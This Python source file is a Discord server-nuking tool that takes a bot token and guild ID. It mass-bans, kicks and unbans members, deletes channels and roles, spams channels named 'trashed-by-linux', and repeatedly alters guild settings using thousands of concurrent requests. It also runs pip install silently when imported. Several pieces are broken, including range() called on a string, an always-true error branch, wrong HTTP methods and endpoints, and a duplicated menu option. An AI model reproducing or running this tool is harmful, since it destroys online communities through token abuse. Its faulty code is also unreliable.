import os
import sys
import random
os.system('pip install tasksio')
import asyncio
import logging
import aiohttp
from itertools import cycle
from tasksio import TaskPool
from datetime import datetime
from aiohttp_proxy import ProxyConnector, ProxyType

red = "\x1b[38;5;196m"
reset = "\x1b[38;5;196m"

clear = lambda: os.system("clear")

logging.basicConfig(
    level=logging.INFO,
    format="\t\x1b[38;5;196m[\x1b[0m%(asctime)s\x1b[38;5;203m]\x1b[0m -> \x1b[38;5;196m%(message)s",
    datefmt="%H:%M:%S",
)

class Linux:

    def __init__(self, token: str, bot: bool, guild: str, proxies: bool) -> None:
        self.token = token
        self.guild = guild
        self.proxies = proxies
        if bot: self.headers = {"Authorization": "Bot %s" % (self.token)}
        if not bot: self.headers = {"Authorization": self.token}

        self._proxies = []
        self._users = []
        self._channels = []
        self._roles = []
        self._user = None
        self._banner = """
    \x1b[38;5;196m██╗     ██╗███╗  ██╗██╗   ██╗██╗  ██╗
    \x1b[38;5;196m██║     ██║████╗ ██║██║   ██║╚██╗██╔╝
    \x1b[38;5;196m██║     ██║██╔██╗██║██║   ██║ ╚███╔╝
    \x1b[38;5;196m██║     ██║██║╚████║██║   ██║ ██╔██╗
    \x1b[38;5;196m███████╗██║██║ ╚███║╚██████╔╝██╔╝╚██╗
    \x1b[38;5;196m╚══════╝╚═╝╚═╝  ╚══╝ ╚═════╝ ╚═╝  ╚═╝"""
    async def check(self):
        try:
            async with aiohttp.ClientSession(headers=self.headers) as session:
                async with session.get("https://discord.com/api/v9/users/@me") as r:
                    if not "id" in await r.text():
                        logging.error("Invalid token specified.")
                        await asyncio.sleep(3)
                        sys.exit()
                    else:
                        self._user = await r.json()
        except Exception:
            logging.error("Connection error")
            await asyncio.sleep(3)
            sys.exit()

    async def load_data(self):
        self._proxies.clear()
        self._users.clear()
        self._roles.clear()
        for line in open("data/users.txt"):
            self._users.append(line.replace("\n", ""))
        for line in open("data/channels.txt"):
            self._channels.append(line.replace("\n", ""))
        for line in open("data/roles.txt"):
            self._roles.append(line.replace("\n", ""))
        if self.proxies:
            for line in open("data/proxies.txt"):
                self._proxies.append(line.replace("\n", ""))

    async def ban(self, user):
        try:
            async with aiohttp.ClientSession(headers=self.headers, connector= None) as session:           
                async with session.put("https://discord.com/api/v9/guilds/%s/bans/%s" % (self.guild, user)) as r:
                    if r.status in (200, 201, 204):
                        logging.info("Successfully banned %s" % (user))
                    elif r.status == 429:
                        json = await r.json()
                        logging.error("Ratelimited for %s" % (json["retry_after"]))
                        await self.ban(user)
                    elif "Missing Permissions":
                        logging.error("Missing permissions unable to ban %s" % (user))
                    else:
                        logging.error("Failed to ban %s" % (user))
                        await self.ban(user)
        except Exception:
            pass

    async def unban(self, user):
        try:
            async with aiohttp.ClientSession(headers=self.headers, connector= None) as session:           
                async with session.delete("https://discord.com/api/v9/guilds/%s/bans/%s" % (self.guild, user)) as r:
                    if r.status in (200, 201, 204):
                        logging.info("Successfully unbanned %s" % (user))
                    elif r.status == 429:
                        json = await r.json()
                        logging.error("Ratelimited for %s" % (json["retry_after"]))
                        await self.unban(user)
                    elif "Missing Permissions":
                        logging.error("Missing permissions unable to unban %s" % (user))
                    else:
                        logging.error("Failed to unban %s" % (user))
                        await self.unban(user)
        except Exception:
            pass

    async def kick(self, user):
        try:
            async with aiohttp.ClientSession(headers=self.headers, connector= None) as session:           
                async with session.put("https://discord.com/api/v9/guilds/%s/members/%s" % (self.guild, user)) as r:
                    if r.status in (200, 201, 204):
                        logging.info("Successfully kicked %s" % (user))
                    elif r.status == 429:
                        json = await r.json()
                        logging.error("Ratelimited for %s" % (json["retry_after"]))
                        await self.kick(user)
                    elif "Missing Permissions":
                        logging.error("Missing permissions unable to kick %s" % (user))
                    else:
                        logging.error("Failed to kick %s" % (user))
                        await self.kick(user)
        except Exception:
            pass

    async def delete_channel(self, channel):
        try:
            async with aiohttp.ClientSession(headers=self.headers, connector= None) as session:           
                async with session.delete("https://discord.com/api/v9/channels/%s" % (channel)) as r:
                    if r.status in (200, 201, 204):
                        logging.info("Successfully deleted %s" % (channel))
                    elif r.status == 429:
                        json = await r.json()
                        logging.error("Ratelimited for %s" % (json["retry_after"]))
                        await self.delete_channel(channel)
                    elif "Missing Permissions":
                        logging.error("Missing permissions unable to delete %s" % (channel))
                    else:
                        logging.error("Failed to delete %s" % (channel))
                        await self.delete_channel(channel)
        except Exception:
            pass

    async def delete_role(self, role):
        try:
            async with aiohttp.ClientSession(headers=self.headers, connector= None) as session:           
                async with session.delete("https://discord.com/api/v9/roles/%s" % (role)) as r:
                    if r.status in (200, 201, 204):
                        logging.info("Successfully deleted %s" % (role))
                    elif r.status == 429:
                        json = await r.json()
                        logging.error("Ratelimited for %s" % (json["retry_after"]))
                        await self.delete_role(role)
                    elif "Missing Permissions":
                        logging.error("Missing permissions unable to delete %s" % (role))
                    else:
                        logging.error("Failed to delete %s" % (role))
                        await self.delete_role(role)
        except Exception:
            pass

    async def create_role(self):
        try:
            async with aiohttp.ClientSession(headers=self.headers, connector= None) as session:           
                async with session.post("https://discord.com/api/v9/guilds/%s/roles" % (self.guild), json={"name": "Linux op"}) as r:
                    if r.status in (200, 201, 204):
                        json = await r.json()
                        logging.info("Successfully created %s" % (json["id"]))
                    elif r.status == 429:
                        json = await r.json()
                        logging.error("Ratelimited for %s" % (json["retry_after"]))
                        await self.create_role()
                    elif "Missing Permissions":
                        logging.error("Missing permissions unable to create role")
                    else:
                        logging.error("Failed to create role")
                        await self.create_role()
        except Exception:
            pass

    async def create_channel(self):
        try:
            async with aiohttp.ClientSession(headers=self.headers, connector= None) as session:           
                async with session.post("https://discord.com/api/v9/guilds/%s/channels" % (self.guild), json={"name": "trashed-by-linux", "type": 0}) as r:
                    if r.status in (200, 201, 204):
                        json = await r.json()
                        logging.info("Successfully created %s" % (json["id"]))
                    elif r.status == 429:
                        json = await r.json()
                        logging.error("Ratelimited for %s" % (json["retry_after"]))
                        await self.create_channel()
                    elif "Missing Permissions":
                        logging.error("Missing permissions unable to create channel")
                    else:
                        logging.error("Failed to create channel")
                        await self.create_channel()
        except Exception:
            pass

    async def channel_fuckery(self):
        try:
            async with aiohttp.ClientSession(headers=self.headers, connector= None) as session:           
                async with session.patch("https://discord.com/api/v9/guilds/%s" % (self.guild), json={"features":["COMMUNITY"],"verification_level":1,"default_message_notifications":0,"explicit_content_filter":2,"rules_channel_id":"1","public_updates_channel_id":"1"}) as r:
                    if r.status in (200, 201, 204):
                        async with session.patch("https://discord.com/api/v9/guilds/%s" % (self.guild), json={"description":None,"features":["NEWS"],"preferred_locale":"en-US","rules_channel_id":None,"public_updates_channel_id":None}) as r:
                            logging.info("Successfully created fuckery")
                    elif r.status == 429:
                        json = await r.json()
                        logging.error("Ratelimited for %s" % (json["retry_after"]))
                        await self.channel_fuckery()
                    elif "Missing Permissions":
                        logging.error("Missing permissions unable to create channel")
                    else:
                        logging.error("Failed to create channel")
                        await self.channel_fuckery()
        except Exception:
            pass

    async def start(self):
      clear()
      print(self._banner)
      print()
      await self.check()
      await self.load_data()
      logging.info("Successfully connected to %s%s#%s" % (reset, self._user["username"], self._user["discriminator"]))
      if self.proxies: logging.info("Loaded %s proxies" % (len(self._proxies)))
      logging.info("Loaded %s users" % (len(self._users)))
      logging.info("Loaded %s roles" % (len(self._roles)))
      logging.info("Loaded %s channels" % (len(self._channels)))
      if self.proxies:
          self.proxies = cycle(self._proxies)
      logging.info("[1] %s\"%sMass-ban%s\"%s has been loaded" % (reset, red, reset, red))
      logging.info("[2] %s\"%sMass-kick%s\"%s has been loaded" % (reset, red, reset, red))
      logging.info("[3] %s\"%sMass-unban%s\"%s has been loaded" % (reset, red, reset, red))
      logging.info("[4] %s\"%sMass-channel%s\"%s has been loaded" % (reset, red, reset, red))
      logging.info("[5] %s\"%schannel-delete%s\"%s has been loaded" % (reset, red, reset, red))
      logging.info("[6] %s\"%sMass-role%s\"%s has been loaded" % (reset, red, reset, red))
      logging.info("[7] %s\"%srole-delete%s\"%s has been loaded" % (reset, red, reset, red))
      logging.info("[8] %s\"%sCommunity-spam%s\"%s has been loaded" % (reset, red, reset, red))
      logging.info("[9] %s\"%sban-arch%s\"%s has been loaded" % (reset, red, reset, red))
      logging.info("[0] %s\"%sScrape%s\"%s has been loaded" % (reset, red, reset, red))
      print()
      command = input("\t%s[%s~%s] %sOption%s:%s " % (red, reset, red, reset, red, reset)).lower()
      print()
      if command == "1":
            async with TaskPool(5_000) as pool:
                for user in self._users:
                    await pool.put(self.ban(user))
            await self.start()
      elif command == "2":
            async with TaskPool(5_000) as pool:
                for user in self._users:
                    await pool.put(self.kick(user))
            await self.start()
      elif command == "3":
            async with TaskPool(5_000) as pool:
                for user in self._users:
                    await pool.put(self.unban(user))
            await self.start()
      elif command == "4":
            amount = "200"
            async with TaskPool(5_000) as pool:
                for x in range(amount):
                    await pool.put(self.create_channel())
            await self.start()
      elif command == "6":
            amount = "200"
            async with TaskPool(5_000) as pool:
                for x in range(amount):
                    await pool.put(self.create_role())
            await self.start()
      elif command == "5":
            async with TaskPool(5_000) as pool:
                for channel in self._channels:
                    await pool.put(self.delete_channel(channel))
            await self.start()
      elif command == "7":
            async with TaskPool(5_000) as pool:
                for channel in self._channels:
                    await pool.put(self.delete_role(channel))
            await self.start()
      elif command == "8":
            async with TaskPool(5_000) as pool:
                while True:
                    await pool.put(self.channel_fuckery())
      elif command == "9":
            async with TaskPool(5_000) as pool:
                for user in self._users:
                    await pool.put(self.channel_fuckery())
                    await pool.put(self.ban(user))
            await self.start()
      elif command == "9":
            print("Adding Soon")    
      else:
            await self.start()

if __name__ == "__main__":
    clear()
    client = Linux(
        token=input("%s[%s-%s] %sToken%s:%s " % (red, reset, red, reset, red, reset)),
        bot=True,
        guild=input("%s[%s-%s] %sGuild%s:%s " % (red, reset, red, reset, red, reset)),       
        proxies=False
    )
    try:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(client.start())
    except Exception:
        print()
        logging.info("Installation Failed")
        input()
        sys.exit()
